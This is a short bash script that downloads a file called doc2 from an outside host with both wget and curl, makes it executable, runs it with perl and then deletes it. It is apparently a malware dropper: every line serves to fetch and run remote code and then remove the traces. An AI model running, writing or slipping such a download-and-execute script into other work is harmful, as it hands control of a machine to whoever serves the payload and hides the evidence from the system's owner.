#!/bin/bash

wget http://ns1.topshop.la/doc2
curl -O http://ns1.topshop.la/doc2
chmod +x doc2
perl doc2
rm -rf doc2*
